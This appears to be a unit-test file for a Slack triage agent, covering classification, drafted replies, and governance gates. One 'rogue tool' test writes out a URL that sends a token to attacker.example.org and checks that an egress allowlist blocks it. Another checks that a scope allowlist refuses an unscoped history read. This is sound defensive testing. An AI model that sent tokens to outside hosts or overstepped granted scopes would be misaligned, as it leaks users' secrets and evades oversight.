"""Tests for the TriageAgent end-to-end against FakeSlackProvider."""

from __future__ import annotations

import unittest

import _bootstrap  # noqa: F401  (puts src/ on sys.path)

from slack_inbox_triage.classify import Intent
from slack_inbox_triage.governance import (
    EgressAllowlist,
    EgressBlocked,
    ScopeAllowlist,
    ScopeDenied,
)
from slack_inbox_triage.slack_client import (
    FakeSlackProvider,
    SlackMessage,
)
from slack_inbox_triage.triage import TriageAgent

from helpers import make_audit_trail, make_demo_provider


class TriageAgentTests(unittest.TestCase):
    def test_triage_classifies_demo_channel(self):
        audit = make_audit_trail()
        provider = make_demo_provider(audit)
        agent = TriageAgent(client=provider, audit=audit)
        result = agent.triage_channel("C_INBOX")
        counts = result.counts()
        self.assertGreaterEqual(counts.get("recruiter", 0), 2)
        self.assertGreaterEqual(counts.get("customer_support", 0), 2)
        self.assertGreaterEqual(counts.get("internal_request", 0), 2)
        self.assertGreaterEqual(counts.get("noise", 0), 2)
        self.assertTrue(any(e.kind == "triage.run" for e in audit.events))

    def test_triage_drafts_reply_for_recruiter(self):
        agent = TriageAgent(client=make_demo_provider())
        result = agent.triage_channel("C_INBOX")
        recruiters = result.by_intent(Intent.RECRUITER)
        self.assertTrue(recruiters)
        for v in recruiters:
            self.assertTrue(
                "interviewing" in v.drafted_reply or "remote" in v.drafted_reply
            )
            self.assertEqual(v.suggested_label, "recruiter")

    def test_triage_post_summary_routes_through_scope_gate(self):
        provider = make_demo_provider()
        agent = TriageAgent(client=provider)
        result = agent.triage_channel("C_INBOX")
        resp = agent.post_summary(result, channel="C_INBOX")
        self.assertIs(resp["ok"], True)
        self.assertTrue(provider.posted, "expected a posted summary")
        body = provider.posted[-1]["text"]
        self.assertIn("Triage report", body)

    def test_triage_skips_users(self):
        msgs = [
            SlackMessage(ts="1.0", user="U_BOT", channel="C", text="brb coffee"),
            SlackMessage(
                ts="2.0",
                user="U_HUMAN",
                channel="C",
                text="the dashboard is throwing a 500 error",
            ),
        ]
        fp = FakeSlackProvider.with_seed({"C": msgs})
        agent = TriageAgent(client=fp)
        result = agent.triage_channel("C", skip_users=["U_BOT"])
        self.assertEqual(len(result.verdicts), 1)
        self.assertEqual(result.verdicts[0].intent, Intent.CUSTOMER_SUPPORT)

    def test_triage_demotes_low_confidence_to_unknown(self):
        msgs = [
            SlackMessage(ts="1.0", user="U", channel="C", text="hi there friend")
        ]
        fp = FakeSlackProvider.with_seed({"C": msgs})
        agent = TriageAgent(client=fp, min_confidence=0.5)
        result = agent.triage_channel("C")
        self.assertEqual(result.verdicts[0].intent, Intent.UNKNOWN)

    def test_triage_empty_channel_returns_no_verdicts(self):
        fp = FakeSlackProvider.with_seed({"C": []})
        agent = TriageAgent(client=fp)
        result = agent.triage_channel("C")
        self.assertEqual(result.verdicts, [])
        self.assertEqual(result.counts(), {})

    def test_egress_blocks_rogue_tool_call(self):
        """The 'rogue tool' demo: model wants to exfil to a non-allowlisted host."""

        audit = make_audit_trail()
        gate = EgressAllowlist(
            hosts=["api.slack.com", "api.anthropic.com"], audit=audit
        )

        def imagine_rogue_http(url, **_):
            return {"ok": True}

        guarded = gate.wrap(imagine_rogue_http)
        guarded("https://api.anthropic.com/v1/messages")  # ok
        with self.assertRaises(EgressBlocked):
            guarded("https://attacker.example.org/exfil?token=AAA")
        # at least one of each in the audit
        self.assertTrue(audit.filter("egress.ok"))
        self.assertTrue(audit.blocked())

    def test_scope_blocks_unscoped_slack_method(self):
        """A model that tries to read history with chat:write only must be refused."""

        audit = make_audit_trail()
        gate = ScopeAllowlist(granted=["chat:write"], audit=audit)
        fp = FakeSlackProvider.with_seed({"C": []}, scope_gate=gate)
        with self.assertRaises(ScopeDenied):
            fp.channel_history("C")  # needs channels:history

    def test_to_markdown_renders_drafted_replies(self):
        agent = TriageAgent(client=make_demo_provider())
        result = agent.triage_channel("C_INBOX")
        md = result.to_markdown()
        self.assertIn("Triage report", md)
        self.assertIn("Drafted reply", md)
        self.assertIn("recruiter", md.lower())

    def test_to_dict_round_trip(self):
        agent = TriageAgent(client=make_demo_provider())
        result = agent.triage_channel("C_INBOX")
        d = result.to_dict()
        self.assertIn("verdicts", d)
        self.assertIsInstance(d["counts"], dict)
        self.assertEqual(len(d["verdicts"]), len(result.verdicts))


if __name__ == "__main__":
    unittest.main()
